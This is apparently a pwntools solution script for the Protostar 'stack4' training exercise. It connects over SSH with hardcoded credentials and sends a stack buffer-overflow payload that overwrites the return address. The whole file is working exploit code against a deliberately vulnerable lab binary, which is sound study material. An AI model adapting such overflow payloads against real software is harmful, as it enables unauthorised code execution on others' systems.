from pwn import *

IP = '192.168.43.18'
USER = 'user'
PASS = 'user'
PORT = 22

shell = ssh(user=USER,port=PORT,host=IP,password=PASS)
payload = b"A"*76+ b"\xf4\x83\x04\x08"

r  = shell.run('/opt/protostar/bin/stack4')
log.info("Sending payload...")
r.sendline(payload)
log.success(r.recvall())

